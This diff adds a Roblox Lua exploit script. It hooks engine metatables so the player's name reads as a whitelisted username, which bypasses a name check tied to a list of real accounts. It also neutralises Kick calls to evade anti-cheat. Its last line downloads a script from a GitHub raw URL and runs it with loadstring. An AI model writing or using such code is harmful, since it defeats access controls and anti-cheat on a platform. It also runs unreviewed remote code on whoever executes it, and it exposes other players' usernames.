@@ -1,0 +1,64 @@
+local spoofedUsername = "C4OS_Ld"
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+local whitelistedUsername = lp.Name
+
+local mt = getrawmetatable(game)
+setreadonly(mt, false)
+local oldIndex = mt.__index
+mt.__index = newcclosure(function(t, k)
+    if t == lp and k == "Name" then
+        return spoofedUsername
+    end
+    return oldIndex(t, k)
+end)
+setreadonly(mt, true)
+
+local playerMT = getrawmetatable(lp)
+setreadonly(playerMT, false)
+local oldIndex3 = playerMT.__index
+local oldNamecall = playerMT.__namecall
+
+playerMT.__index = newcclosure(function(t, k)
+    if k == "Kick" then
+        return function() end
+    end
+    return oldIndex3(t, k)
+end)
+
+playerMT.__namecall = newcclosure(function(self, ...)
+    local method = getnamecallmethod()
+    if method == "Kick" then
+        return
+    end
+    return oldNamecall(self, ...)
+end)
+
+setreadonly(playerMT, true)
+
+local function bypassPlayerNameCheck()
+    local _LocalPlayer5 = game:GetService("Players").LocalPlayer
+    local _call7 = game:GetService("ReplicatedStorage")
+    local validNames = {
+        "axxoryyy", "C4OS_Ld", "NW_GlitcherLambda", "Matias_XD2021", "12345AB801",
+        "BloodPuppit2", "LK_HAZ2", "JayTonCost_24k", "singkomong04", " Mrbignewcoming3",
+        "Shadow_RipperZ0", "Elijahbetter785", "Backaccountgotstolen", "HoloGrindz", "Mintysmug",
+        "roi_aksbrother", "Hi_dorihi", "Terrionp20"
+    }
+    
+    table.insert(validNames, spoofedUsername)
+    table.find(validNames, _LocalPlayer5.Name)
+end
+
+bypassPlayerNameCheck()
+
+local function safeLoadString(url)
+    local success, result = pcall(function()
+        loadstring(game:HttpGet(url))()
+    end)
+    if not success then
+        warn("Error loading script: " .. result)
+    end
+end
+
+safeLoadString("https://raw.githubusercontent.com/UnknownCodersonLT4/Roblox/refs/heads/main/ML/Games.lua")
